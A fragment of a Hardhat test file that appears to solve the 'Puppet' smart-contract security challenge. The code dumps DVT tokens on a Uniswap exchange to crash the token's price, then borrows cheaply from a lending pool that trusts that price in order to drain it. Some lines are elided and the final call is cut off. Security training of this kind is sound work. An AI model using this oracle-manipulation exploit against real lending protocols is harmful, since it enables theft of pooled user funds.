...
describe("[Challenge] Puppet", function () {
  ...
  it("Execution", async function () {
    ...
    /**
     * Main idea here is to manipulate the price of DVT in the uniswap exchange in order to lower its price so we can buy a lot of it
     */

    //approve exchange for the amount of token
    await token
      .connect(player)
      .approve(uniswapExchange.address, PLAYER_INITIAL_TOKEN_BALANCE);

    //sell our tokens to the exchange
    ...
    //Calculate how much to borrow 1 token
    let ethToDVT = await lendingPool.calculateDepositRequired(
      POOL_INITIAL_TOKEN_BALANCE
    );

    //calculate how many tokens we can borrow
    let tokenToBorrow =
      (await ethers.provider.getBalance(player.address)) / ethToDVT;

    //borrow tokens to drain the pool
    await lendingPool
      .connect(player)
